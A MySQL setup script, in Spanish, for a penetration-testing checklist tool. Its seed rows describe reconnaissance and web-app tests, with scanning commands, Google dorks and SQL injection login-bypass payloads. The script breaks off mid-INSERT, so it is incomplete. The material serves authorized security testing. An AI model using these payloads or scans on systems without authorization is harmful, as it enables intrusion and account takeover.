SET NAMES utf8mb4;
SET CHARACTER SET utf8mb4;

-- Tabla de usuarios
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(100) NOT NULL UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO users (name, email) VALUES 
    ('Usuario Prueba', 'prueba@ejemplo.com'),
    ('Administrador', 'admin@ejemplo.com');

-- Tabla de proyectos
CREATE TABLE IF NOT EXISTS projects (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    status VARCHAR(50) DEFAULT 'active',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabla de targets (objetivos dentro de cada proyecto)
CREATE TABLE IF NOT EXISTS targets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    project_id INT NOT NULL,
    name VARCHAR(255) NOT NULL,
    target VARCHAR(500),
    target_type ENUM('url', 'ip', 'domain') DEFAULT 'url',
    description TEXT,
    status VARCHAR(50) DEFAULT 'active',
    progress DECIMAL(5,2) DEFAULT 0.00,
    notes TEXT,
    aggregated_notes TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabla de categorías de testing
CREATE TABLE IF NOT EXISTS categories (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    description TEXT,
    order_num INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabla de items de checklist (plantilla base)
CREATE TABLE IF NOT EXISTS checklist_items (
    id INT AUTO_INCREMENT PRIMARY KEY,
    category_id INT NOT NULL,
    title TEXT NOT NULL,
    description TEXT,
    order_num INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (category_id) REFERENCES categories(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabla de checklist por target (copia de la checklist para cada target)
CREATE TABLE IF NOT EXISTS target_checklist (
    id INT AUTO_INCREMENT PRIMARY KEY,
    target_id INT NOT NULL,
    checklist_item_id INT NOT NULL,
    is_checked BOOLEAN DEFAULT FALSE,
    notes TEXT,
    severity ENUM('low', 'medium', 'high', 'critical', 'info') DEFAULT 'info',
    checked_at TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE,
    FOREIGN KEY (checklist_item_id) REFERENCES checklist_items(id) ON DELETE CASCADE,
    UNIQUE KEY unique_target_item (target_id, checklist_item_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabla de historial de notas
CREATE TABLE IF NOT EXISTS notes_history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    target_id INT NOT NULL,
    checklist_item_id INT NOT NULL,
    old_notes TEXT,
    new_notes TEXT,
    severity VARCHAR(50),
    changed_by VARCHAR(100) DEFAULT 'system',
    change_type ENUM('created', 'updated', 'deleted', 'severity_changed') DEFAULT 'updated',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (target_id) REFERENCES targets(id) ON DELETE CASCADE,
    FOREIGN KEY (checklist_item_id) REFERENCES checklist_items(id) ON DELETE CASCADE,
    INDEX idx_target_id (target_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Aumentar el límite de GROUP_CONCAT globalmente
SET GLOBAL group_concat_max_len = 10000000;

-- Trigger para actualizar automáticamente las notas del target (INSERT)
DELIMITER //

CREATE TRIGGER update_target_notes_on_insert
AFTER INSERT ON target_checklist
FOR EACH ROW
BEGIN
    DECLARE v_old_notes TEXT;
    
    SET SESSION group_concat_max_len = 10000000;
    
    -- Registrar en historial
    INSERT INTO notes_history (target_id, checklist_item_id, new_notes, severity, change_type, created_at)
    VALUES (NEW.target_id, NEW.checklist_item_id, NEW.notes, NEW.severity, 'created', NOW());
    
    -- Actualizar notas agregadas solo si hay notas
    IF NEW.notes IS NOT NULL AND NEW.notes != '' THEN
        UPDATE targets 
        SET aggregated_notes = (
            SELECT GROUP_CONCAT(
                CONCAT(
                    '[', DATE_FORMAT(tc.updated_at, '%Y-%m-%d %H:%i'), '] ',
                    UPPER(tc.severity), ': ',
                    ci.title, '\n', 
                    tc.notes
                )
                SEPARATOR '\n\n---\n\n'
            )
            FROM target_checklist tc
            INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
            WHERE tc.target_id = NEW.target_id 
            AND tc.notes IS NOT NULL 
            AND tc.notes != ''
            ORDER BY tc.updated_at DESC
        )
        WHERE id = NEW.target_id;
    END IF;
END//

-- Trigger para actualizar automáticamente las notas del target (UPDATE)
CREATE TRIGGER update_target_notes_on_update
AFTER UPDATE ON target_checklist
FOR EACH ROW
BEGIN
    SET SESSION group_concat_max_len = 10000000;
    
    -- Registrar en historial si las notas cambiaron
    IF OLD.notes != NEW.notes OR OLD.severity != NEW.severity THEN
        INSERT INTO notes_history (target_id, checklist_item_id, old_notes, new_notes, severity, change_type, created_at)
        VALUES (NEW.target_id, NEW.checklist_item_id, OLD.notes, NEW.notes, NEW.severity, 'updated', NOW());
    END IF;
    
    -- Actualizar notas agregadas
    UPDATE targets 
    SET aggregated_notes = (
        SELECT GROUP_CONCAT(
            CONCAT(
                '[', DATE_FORMAT(tc.updated_at, '%Y-%m-%d %H:%i'), '] ',
                UPPER(tc.severity), ': ',
                ci.title, '\n', 
                tc.notes
            )
            SEPARATOR '\n\n---\n\n'
        )
        FROM target_checklist tc
        INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
        WHERE tc.target_id = NEW.target_id 
        AND tc.notes IS NOT NULL 
        AND tc.notes != ''
        ORDER BY tc.updated_at DESC
    )
    WHERE id = NEW.target_id;
END//

-- Trigger para actualizar automáticamente las notas del target (DELETE)
CREATE TRIGGER update_target_notes_on_delete
AFTER DELETE ON target_checklist
FOR EACH ROW
BEGIN
    SET SESSION group_concat_max_len = 10000000;
    
    -- Registrar en historial
    INSERT INTO notes_history (target_id, checklist_item_id, old_notes, change_type, created_at)
    VALUES (OLD.target_id, OLD.checklist_item_id, OLD.notes, 'deleted', NOW());
    
    -- Actualizar notas agregadas
    UPDATE targets 
    SET aggregated_notes = (
        SELECT GROUP_CONCAT(
            CONCAT(
                '[', DATE_FORMAT(tc.updated_at, '%Y-%m-%d %H:%i'), '] ',
                UPPER(tc.severity), ': ',
                ci.title, '\n', 
                tc.notes
            )
            SEPARATOR '\n\n---\n\n'
        )
        FROM target_checklist tc
        INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
        WHERE tc.target_id = OLD.target_id 
        AND tc.notes IS NOT NULL 
        AND tc.notes != ''
        ORDER BY tc.updated_at DESC
    )
    WHERE id = OLD.target_id;
END//

DELIMITER ;

-- Inserir categories
INSERT INTO categories (name, description, order_num) VALUES
('Fase de Reconocimiento', 'Reconocimiento y recopilación de información', 1),
('Pruebas de Registro de Usuarios', 'Pruebas de funcionalidad de registro de usuarios', 2),
('Pruebas de Gestión de Sesiones', 'Pruebas de manejo de sesiones y cookies', 3),
('Pruebas de Autenticación', 'Pruebas de mecanismos de login y autenticación', 4),
('Pruebas de Mi Cuenta (Post-Login)', 'Pruebas de características después de la autenticación', 5),
('Pruebas de Recuperación de Contraseña', 'Pruebas de funcionalidad de recuperación de contraseña', 6),
('Pruebas de Formulario de Contacto', 'Pruebas de formularios de contacto', 7),
('Pruebas de Compra de Productos', 'Pruebas de funcionalidad de comercio electrónico', 8),
('Pruebas de Aplicación Bancaria', 'Pruebas de características específicas de banca', 9),
('Pruebas de Redirección Abierta', 'Pruebas de vulnerabilidades de redirección abierta', 10),
('Inyección de Encabezado Host', 'Pruebas de manipulación de encabezado Host', 11),
('Pruebas de Inyección SQL', 'Pruebas de vulnerabilidades de inyección SQL', 12),
('Pruebas de Cross-Site Scripting', 'Pruebas de vulnerabilidades XSS', 13),
('Pruebas de CSRF', 'Pruebas de Cross-Site Request Forgery', 14),
('Vulnerabilidades SSO', 'Pruebas de implementaciones de Sign-On Único', 15),
('Pruebas de Inyección XML', 'Pruebas de vulnerabilidades XXE', 16),
('CORS', 'Pruebas de Cross-Origin Resource Sharing', 17),
('SSRF', 'Pruebas de Server-Side Request Forgery', 18),
('Pruebas de Carga de Archivos', 'Pruebas de funcionalidad de carga de archivos', 19),
('Pruebas de CAPTCHA', 'Pruebas de implementaciones de CAPTCHA', 20),
('Pruebas de Token JWT', 'Pruebas de JSON Web Tokens', 21),
('Pruebas de Websockets', 'Pruebas de conexiones WebSocket', 22),
('Pruebas de Vulnerabilidades de GraphQL', 'Pruebas de implementaciones de GraphQL', 23),
('Vulnerabilidades Comunes de WordPress', 'Pruebas de problemas específicos de WordPress', 24),
('Inyección XPath', 'Pruebas de vulnerabilidades de inyección XPath', 25),
('Inyección LDAP', 'Pruebas de vulnerabilidades de inyección LDAP', 26),
('Denegación de Servicio', 'Pruebas de vulnerabilidades DoS', 27),
('Bypass 403', 'Pruebas de bypasses de control de acceso 403', 28),
('Otros Casos de Prueba', 'Pruebas de seguridad diversas', 29),
('Extensiones de Burp Suite', 'Extensiones útiles de Burp Suite', 30);

-- Inserir items de Fase de Reconocimiento con descripciones tipo "Guía Maestra"
INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(1, 'Identificar servidor web, tecnologías y base de datos', 'Identifica la pila tecnológica para buscar CVEs específicos.\n\n- **Headers:** Busca `Server`, `X-Powered-By`, `X-AspNet-Version`.\n- **Cookies:** `PHPSESSID` (PHP), `JSESSIONID` (Java), `ASPSESSIONID` (ASP).\n- **WAF:** Ejecuta `wafw00f <url>` para ver si hay firewall.\n- **CMS:** Si es WordPress/Joomla, usa `wpscan` o `joomscan`.\n\n**Herramientas:** `Wappalyzer` (Extensión), `WhatWeb -a 3 <url>`, `BuiltWith`.', 1),

(1, 'Enumeración de Subsidiarias y Adquisiciones', 'Las empresas grandes son seguras; sus filiales nuevas no. Amplía el alcance (Scope).\n\n- **Finanzas:** Busca en Crunchbase o Google Finance "adquisiciones recientes".\n- **Legal:** Revisa los términos y condiciones o el pie de página para ver nombres de empresas legales.\n- **ASN:** Verifica si las subsidiarias usan el mismo ASN o uno propio.\n\n**Recursos:** `Crunchbase`, `Wikipedia`, `Registros WHOIS`.', 2),

(1, 'Búsqueda Inversa', 'Descubre qué otros sitios conviven en el mismo servidor (Virtual Hosting).\n\n- **Riesgo:** Si un sitio vecino es vulnerable, puedes escalar privilegios al servidor y atacar tu objetivo desde dentro.\n- **Acción:** Toma la IP del objetivo y busca todos los dominios asociados.\n\n**Herramientas:** `DNSDumpster`, `Bing (ip:x.x.x.x)`, `hackertarget.com`.', 3),

(1, 'Enumeración de Espacio ASN e IP y Enumeración de Servicios', 'No te limites al dominio principal. Mapea toda la red.\n\n- **ASN:** Encuentra el "Autonomous System Number" de la empresa (e.g., AS1234).\n- **CIDR:** Obtén los rangos de IP (e.g., 192.168.0.0/24).\n- **Comando:** `whois -h whois.radb.net -- ''-i origin AS1234'' | grep -Eo "([0-9.]+){4}/[0-9]+"`\n\n**Herramientas:** `Amass intel -org <empresa>`, `BGP.he.net`.', 4),

(1, 'Google Dorking', 'Hacking sin tocar el servidor. Usa la "Google Hacking Database" (GHDB).\n\n- **Fugas:** `site:target.com ext:log OR ext:txt OR ext:conf`\n- **Paneles:** `site:target.com inurl:login OR intitle:"Index of"`\n- **Nube:** `site:s3.amazonaws.com "target"`\n- **Backup:** `site:target.com ext:bak OR ext:old`\n\n**Recurso:** `Exploit-DB GHDB`, `DorkSearch`.', 5),

(1, 'Reconocimiento en Github', 'Busca secretos filtrados por desarrolladores.\n\n- **Queries:** Busca "target.com" + "password", "api_key", "aws_access_key", "secret".\n- **Usuarios:** Investiga los perfiles personales de los empleados de la organización.\n- **Historial:** A veces borran la clave, pero queda en el historial de commits.\n\n**Herramientas:** `GitRob`, `TruffleHog`, `Gitleaks`, `Dorks en GitHub`.', 6),

(1, 'Enumeración de Directorios', 'Encuentra lo que el administrador quería esconder.\n\n- **Wordlists:** Usa `SecLists` (Discovery/Web-Content/raft-large-words.txt).\n- **Extensiones:** No olvides buscar `.php`, `.zip`, `.bak`, `.sql`.\n- **Recursividad:** Si encuentras `/admin`, escanea dentro de esa carpeta.\n\n**Herramientas:** `Feroxbuster` (Recomendado), `Gobuster dir`, `Dirsearch`.', 7),

(1, 'Enumeración de Rango de IP', 'Una vez tengas los rangos CIDR, busca máquinas vivas.\n\n- **Ping Sweep:** `nmap -sn -iL rangos.txt -oG vivos.txt`\n- **Objetivo:** Encontrar servidores de desarrollo, staging o bases de datos expuestas que no tienen dominio DNS asignado.\n\n**Herramientas:** `Masscan` (Velocidad), `Nmap` (Precisión).', 8),

(1, 'Análisis de Archivos JS', 'El código JavaScript del cliente contiene el mapa de la API.\n\n- **Búsqueda:** Busca rutas relativas (`/api/v1/user`), claves API y comentarios (`// TODO`).\n- **Source Maps:** Si encuentras archivos `.js.map`, puedes reconstruir el código original legible.\n\n**Herramientas:** `LinkFinder` (Extraer endpoints), `GetJS`, Herramientas de desarrollo del navegador.', 9),

(1, 'Enumeración y Fuerza Bruta de Subdominios', 'La fase más crítica. Más subdominios = Más superficie de ataque.\n\n- **Pasiva:** `Subfinder`, `Crt.sh` (Certificados SSL).\n- **Activa:** `Puredns` o `ShuffleDNS` con un wordlist masivo (e.g., `best-dns-wordlist.txt`).\n- **Permutaciones:** Genera variaciones (`dev-api`, `api-prod`) con `Altdns`.\n\n**Flujo:** Pasivo -> Activo -> Permutación -> Resolución.', 10),

(1, 'Takeover de Subdominio', 'Roba subdominios olvidados.\n\n- **Detección:** Busca CNAMEs que apunten a servicios (AWS, GitHub, Heroku) que devuelvan errores como "NoSuchBucket" o "404 Not Found".\n- **Impacto:** Si lo registras, controlas el contenido que se sirve desde un subdominio legítimo de la empresa (Phishing, Cookies).\n\n**Herramientas:** `Subjack`, `Nuclei -t takeovers`.', 11),

(1, 'Fuzzing de Parámetros', 'Encuentra parámetros ocultos en endpoints válidos.\n\n- **Caso:** Tienes `search.php`. ¿Acepta `?debug=true` o `?admin=1`?\n- **Wordlists:** Usa listas de nombres de parámetros comunes (`id`, `user`, `admin`, `cmd`).\n- **Métodos:** Prueba GET y POST.\n\n**Herramientas:** `Arjun` (Recomendado), `ParamSpider`, `x8`.', 12),

(1, 'Escaneo de Puertos', 'Identifica servicios no-web.\n\n- **Escaneo Total:** `nmap -p- -sS --min-rate 5000 -v <ip>`\n- **Detalle:** Sobre los puertos abiertos: `nmap -p <puertos> -sC -sV`.\n- **Ojo:** No olvides UDP si es relevante (`-sU`), aunque es lento.\n\n**Herramientas:** `Nmap`, `RustScan` (Muy rápido), `Naabu`.', 13),

(1, 'Escaneo Basado en Plantillas (Nuclei)', 'Automatización de vulnerabilidades modernas.\n\n- **Uso:** Escanea tu lista de subdominios vivos con plantillas de la comunidad.\n- **Comando:** `nuclei -l subdominios.txt -t cves/ -t misconfiguration/`\n- **Tip:** Mantén las plantillas actualizadas (`nuclei -update-templates`).\n\n**Herramienta:** `ProjectDiscovery Nuclei`.', 14),

(1, 'Historial de Wayback Machine', 'El archivo de internet es una mina de oro.\n\n- **Qué buscar:** Archivos `robots.txt` antiguos, rutas de API viejas (`/v1/` vs `/v2/`), y parámetros GET en URLs archivadas.\n- **Comparación:** Compara el mapa del sitio actual con el de hace 2 años.\n\n**Herramientas:** `Waymore` (Mejor que waybackurls), `Gau`, `Tomnomnom tools`.', 15),

(1, 'Secuestro de Enlaces Rotos', 'Verifica todos los enlaces externos.\n\n- **Escenario:** La web enlaza al Twitter `@empresa_support`. Esa cuenta fue borrada. Tú la registras y ahora eres el soporte oficial.\n- **Escenario 2:** Scripts JS cargados desde dominios expirados (XSS Stored).\n\n**Herramientas:** `Broken-link-checker`, `SocialHunter`.', 16),

(1, 'Descubrimiento por Motor de Búsqueda de Internet', 'Inteligencia de fuentes abiertas sobre infraestructura.\n\n- **Shodan:** Busca `ssl:"Target Name"` o `org:"Target Name"`.\n- **Censys:** Busca certificados SSL asociados al dominio.\n- **Bypass WAF:** A veces Shodan revela la IP de origen real detrás de Cloudflare.\n\n**Motores:** `Shodan.io`, `Censys.io`, `ZoomEye`.', 17),

(1, 'Almacenamiento en la Nube Mal Configurado', 'Busca cubos (buckets) públicos.\n\n- **Nombres:** Genera permutaciones: `empresa-backup`, `empresa-dev`, `empresa-logs`.\n- **Test:** Intenta listar (`ls`) o subir archivos (`cp test.txt s3://...`).\n- **Azure/GCP:** No olvides los Blobs de Azure y Buckets de Google.\n\n**Herramientas:** `Cloud_enum`, `AWS CLI`, `Lazys3`.', 18);

-- ==========================================
-- CATEGORÍA: Pruebas de Registro de Usuarios (ID 2)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(2, 'Verificar registro duplicado/Sobrescribir usuario existente', 'Verifica si es posible secuestrar cuentas o duplicar datos.\n\n- **Race Condition:** Intenta registrar el mismo usuario en 2 hilos simultáneos (Burp Intruder).\n- **Overwrite:** Si registras un usuario que ya existe, ¿se sobrescribe la contraseña?\n- **Case Sensitivity:** ¿Trata `Admin` y `admin` como usuarios diferentes?\n\n**Impacto:** Toma de control de cuentas (Account Takeover).', 1),

(2, 'Verificar política de contraseña débil', 'La primera línea de defensa contra fuerza bruta.\n\n- **Validación:** Comprueba si la validación es solo en el cliente (JavaScript) eliminándola con Burp.\n- **Tests:** Intenta registrarte con `123456`, `password`, o el mismo nombre de usuario.\n- **Límites:** Verifica longitud mínima (8+) y complejidad.\n\n**Herramientas:** Listas de contraseñas comunes (`RockYou.txt` top 1000).', 2),

(2, 'Verificar reutilización de nombres de usuario existentes', 'Enumeración de usuarios (User Enumeration).\n\n- **Error Messages:** Compara las respuestas. \n  - "User created" vs "Username taken" -> **Vulnerable** (Permite enumerar usuarios).\n  - "Check your email" (para ambos casos) -> **Seguro**.\n- **Timing:** Mide el tiempo de respuesta. Si tarda más cuando el usuario existe, es una vulnerabilidad de tiempo.', 3),

(2, 'Verificar proceso de verificación de email insuficiente', 'Evita el acceso a funciones autenticadas sin validar el correo.\n\n- **Forced Browsing:** Regístrate, no valides el email, e intenta navegar a `/dashboard` o `/profile`.\n- **Token:** Verifica si el token de activación es predecible o secuencial.\n- **Reutilización:** ¿El mismo enlace de activación funciona dos veces?', 4),

(2, 'Implementación débil de registro - Permite direcciones de correo desechables', 'Abuso de lógica de negocio (Spam/Freemium).\n\n- **Prueba:** Intenta registrarte con dominios temporales.\n- **Dominios:** `@mailinator.com`, `@guerrillamail.com`, `@10minutemail.com`.\n- **Riesgo:** Permite a atacantes crear cuentas bot masivas o saltarse bloqueos.\n\n**Herramientas:** Scripts de validación de MX.', 5),

(2, 'Implementación débil de registro - Por HTTP', 'Credenciales en texto plano.\n\n- **Sniffing:** Si el registro viaja por HTTP, cualquiera en la red (WiFi pública) puede ver el usuario y contraseña.\n- **SSL Strip:** Verifica si el sitio fuerza HTTPS o permite downgrade a HTTP.\n\n**Herramientas:** `Wireshark`, `Burp Suite Proxy` (Verifica el protocolo en el historial).', 6),

(2, 'Sobrescribir páginas web de aplicación por defecto mediante nombres de usuario especialmente diseñados', 'Escalada de privilegios vía nombres reservados.\n\n- **Concepto:** ¿Qué pasa si te registras como `admin`, `support`, `test` o `ftp`?\n- **Rutas:** Si el perfil de usuario es `site.com/usuario`, registrarse como `admin` podría bloquear el acceso al panel real de administración (`site.com/admin`).\n- **Payloads:** Prueba también caracteres especiales: `admin"`, `admin''`, `<script>`.', 7);

-- ==========================================
-- CATEGORÍA: Pruebas de Gestión de Sesiones (ID 3)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(3, 'Identificar cookie de sesión actual de entre el conjunto de cookies en la aplicación', 'No todas las cookies son para autenticación.\n\n- **Análisis:** Identifica cuál mantiene la sesión activa (borra una a una y recarga la página).\n- **Nombres Comunes:** `PHPSESSID` (PHP), `JSESSIONID` (Java), `ASPSESSIONID` (ASP), `connect.sid` (Node).\n- **Objetivo:** Enfoca tus ataques solo en la cookie crítica.', 1),

(3, 'Decodificar cookies usando algunos algoritmos de decodificación estándar', 'Información sensible oculta a simple vista.\n\n- **Base64:** Si termina en `=`, intenta decodificar (`echo "val" | base64 -d`).\n- **JWT:** Si empieza por `ey...`, usa **jwt.io**. Verifica la firma y datos del payload.\n- **Hex/URL:** Decodifica `%xx` o cadenas hexadecimales.\n\n**Riesgo:** Fugas de información (Email, UserID, Roles) o Deserialización insegura.', 2),

(3, 'Modificar el valor del token de sesión cookie por 1 bit/byte', 'Prueba la aleatoriedad de la sesión (Entropy).\n\n- **Secuencialidad:** Si mi cookie es `...123`, ¿puedo acceder como otro usuario cambiando a `...124`?\n- **Análisis:** Usa **Burp Sequencer**. Captura miles de tokens para analizar si son realmente aleatorios.\n- **Objetivo:** Session Hijacking (Predicción de sesiones).', 3),

(3, 'Si el auto-registro está disponible... inicia sesión con una serie de nombres de usuario similares', 'Problemas de "Canonicalization".\n\n- **Test:** Crea `usuarioA`. Intenta entrar como `UsuarioA` (Mayúsculas), `usuarioA ` (Espacio al final) o `uscarioA` (Caracteres Unicode visualmente idénticos).\n- **Riesgo:** Si el backend normaliza mal, podrías acceder a la cuenta de la víctima o causar denegación de servicio.', 4),

(3, 'Verificar cookies de sesión y fecha/hora de expiración de cookie', '¿Cuánto vive una sesión?\n\n- **Idle Timeout:** Deja la sesión inactiva 15 min. Recarga. ¿Sigues logueado?\n- **Absolute Timeout:** ¿La sesión muere a las 24h aunque estés activo?\n- **Persistencia:** Si cierras el navegador y lo abres, ¿sigues dentro? (Malo para banca, aceptable para redes sociales).', 5),

(3, 'Identificar el alcance del dominio de cookie', 'Verifica quién puede leer la cookie.\n\n- **Scope Laxo:** Si `Domain=.site.com`, la cookie se envía a `subdominio.site.com`.\n- **Ataque:** Si controlas un subdominio (o encuentras XSS en uno), puedes robar la sesión del dominio principal.\n- **Ideal:** El atributo `Domain` debería estar vacío (Host-Only) o ser muy restrictivo.', 6),

(3, 'Verificar el flag HttpOnly en la cookie', 'Protección contra XSS.\n\n- **Prueba:** Abre la consola del navegador (`F12`) y escribe `document.cookie`.\n- **Resultado:** Si ves la cookie de sesión ahí, **FALTA el flag HttpOnly**.\n- **Impacto:** Un ataque XSS simple puede robar la sesión y enviarla al atacante.', 7),

(3, 'Verificar el flag Secure en la cookie si la aplicación está sobre SSL', 'Protección contra interceptación.\n\n- **Verificación:** Inspecciona la cookie en Burp o DevTools.\n- **Flag:** Debe tener `Secure` activado.\n- **Prueba:** Intenta cambiar la URL de `https://` a `http://`. Si la cookie se envía igual, es vulnerable a intercepción (Man-in-the-Middle).', 8),

(3, 'Verificar la fijación de sesión, es decir, el valor de la cookie de sesión antes y después de la autenticación', 'El ataque clásico de fijación de sesión.\n\n1. Entra al sitio (sin loguearte) y anota la cookie (e.g., `SESS=123`).\n2. Loguéate con tus credenciales.\n3. Verifica la cookie.\n\n**Vulnerable:** Si la cookie sigue siendo `SESS=123`.\n**Seguro:** El servidor debe emitir una **nueva** cookie (e.g., `SESS=456`) al autenticarse.', 9),

(3, 'Reproducir la cookie de sesión desde una dirección IP efectiva diferente o sistema', '¿La sesión viaja con el usuario?\n\n- **Escenario:** Robas una cookie válida. ¿Puedes usarla desde tu PC (otra IP/User-Agent)?\n- **Prueba:** Loguéate en Chrome. Copia la cookie a Firefox o úsala desde una VPN.\n- **Resultado:** Si funciona, la sesión no está vinculada a la IP/Fingerprint (Riesgo alto de robo).', 10),

(3, 'Verificar login concurrente desde máquina/IP diferente', 'Gestión de sesiones múltiples.\n\n- **Test:** Loguéate en PC. Luego en Móvil.\n- **Observa:** ¿Se cierra la sesión del PC? (Single Session Policy).\n- **Banca:** Generalmente debería permitir solo una sesión activa.\n- **General:** Verifica si hay un panel para "Cerrar otras sesiones".', 11),

(3, 'Check if any user pertaining information is stored in cookie value or not', 'Fuga de datos en el cliente.\n\n- **Inspección:** Mira el contenido de todas las cookies.\n- **Banderas rojas:** `role=admin`, `user_id=101`, `email=test@test.com` en texto plano.\n- **Riesgo:** Si modificas `role=admin` a `role=superadmin`, ¿el servidor lo cree? (Mass Assignment en cookies).', 12),

(3, 'Failure to Invalidate Session on (Email Change,2FA Activation)', 'La prueba de revocación crítica.\n\n- **Escenario:** Un atacante tiene acceso a tu cuenta. Tú cambias la contraseña para echarlo.\n- **Test:**\n  1. Loguearse en Navegador A (Víctima) y Navegador B (Atacante).\n  2. En Navegador A, cambia la contraseña.\n  3. Navegador B **debe** ser desconectado inmediatamente.\n- **Fallo:** Si el Navegador B sigue activo, el cambio de contraseña es inútil para recuperar una cuenta hackeada.', 13);

-- ==========================================
-- CATEGORÍA: Pruebas de Autenticación (ID 4)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(4, 'Enumeración de nombres de usuario', 'Determina si un usuario existe basándote en la respuesta del servidor.\n\n- **Mensajes:** "User not found" vs "Incorrect password".\n- **Tiempo:** Si el login tarda 200ms para usuario inválido y 500ms para válido (por el hashing de la password), es vulnerable (Timing Attack).\n- **Forgot Password:** Si dice "Email enviado" vs "Email no registrado".\n\n**Herramientas:** `Burp Intruder` (Pitchfork para correlacionar tiempos).', 1),

(4, 'Eludir autenticación usando varias inyecciones SQL', 'Saltea el login manipulando la consulta SQL subyacente.\n\n- **Lógica:** Convertir `SELECT * FROM users WHERE user=''$u'' AND pass=''$p''` en una tautología (siempre verdadero).\n- **Payloads Username:**\n  - `admin'' --`\n  - `admin'' #`\n  - `admin'' OR 1=1 --`\n  - `'' OR ''1''=''1`\n\n**Objetivo:** Loguearse como el primer usuario de la DB (usualmente el Admin).', 2),

(4, 'Falta de confirmación de contraseña al cambiar correo electrónico', 'Mecanismo crítico para evitar el Account Takeover (ATO).\n\n- **Escenario:** Dejas tu sesión abierta en un cibercafé. Un atacante cambia tu email por el suyo. Luego hace "Reset Password".\n- **Prueba:** Intenta cambiar el email sin introducir la contraseña actual.\n- **Resultado:** Si lo permite, el atacante puede secuestrar la cuenta fácilmente.', 3),

(4, 'Falta de confirmación de contraseña al cambiar contraseña', 'Verificación de identidad antes de acciones sensibles.\n\n- **Vulnerabilidad:** CSRF en el cambio de contraseña.\n- **Prueba:** Si no pide la "Current Password", un atacante podría crear un formulario oculto (CSRF) que, al visitarlo la víctima, cambie su contraseña automáticamente.', 4),

(4, 'Falta de confirmación de contraseña al administrar 2FA', 'Protección de la configuración de seguridad.\n\n- **Riesgo:** Un atacante con acceso temporal (físico o XSS) desactiva el 2FA o cambia el número de teléfono.\n- **Prueba:** Intenta desactivar el 2FA. El sistema **debe** pedir contraseña o un código OTP antes de confirmar la baja.', 5),

(4, '¿Es posible usar recursos sin autenticación? Violación de acceso', 'Broken Access Control / Forced Browsing.\n\n- **Prueba:** Navega como usuario autenticado. Copia las URLs (`/admin/users`, `/invoice/123`). Cierra sesión o usa modo incógnito e intenta acceder a esas URLs.\n- **API:** Haz lo mismo con llamadas API, eliminando el header `Authorization`.\n- **Archivos:** Intenta acceder directamente a `/uploads/private/dni.pdf`.', 6),

(4, 'Verificar si las credenciales del usuario se transmiten sobre SSL o no', 'Protección de datos en tránsito.\n\n- **Verificación:** Usa `Wireshark` o `Burp Proxy`.\n- **Payload:** Busca peticiones `POST /login`. Si el esquema es `http://` en lugar de `https://`, las credenciales van en texto plano.\n- **Riesgo:** Robo de credenciales en redes WiFi públicas (Man-in-the-Middle).', 7),

(4, 'Función de inicio de sesión débil con HTTP y HTTPS disponibles', 'Falta de HSTS o redirección forzada.\n\n- **Downgrade Attack:** Si el sitio soporta ambos, un atacante (MITM) puede forzar al usuario a usar la versión HTTP insegura.\n- **Prueba:** Cambia manualmente `https://` por `http://` en la URL del login. Si la página carga sin redirigir a HTTPS, es vulnerable.', 8),

(4, 'Probar el mecanismo de bloqueo de cuenta de usuario en ataque de fuerza bruta', 'Protección contra adivinación de contraseñas.\n\n- **Prueba:** Intenta loguearte 5-10 veces con contraseña incorrecta.\n- **Esperado:** "Cuenta bloqueada por 30 minutos" o Captcha.\n- **Vulnerable:** Si permite intentos infinitos, se puede usar `Hydra` o `Burp Intruder` para crackear la contraseña.', 9),

(4, 'Eludir el límite de velocidad alterando el agente de usuario a agente móvil', 'Engañando al firewall de aplicaciones (WAF).\n\n- **Lógica:** A veces los desarrolladores relajan la seguridad para apps móviles para evitar bloqueos por cambio de IP (4G/WiFi).\n- **Prueba:** Cambia el `User-Agent` a `Mozilla/5.0 (iPhone; CPU iPhone OS...)`. Reintenta el ataque de fuerza bruta.', 10),

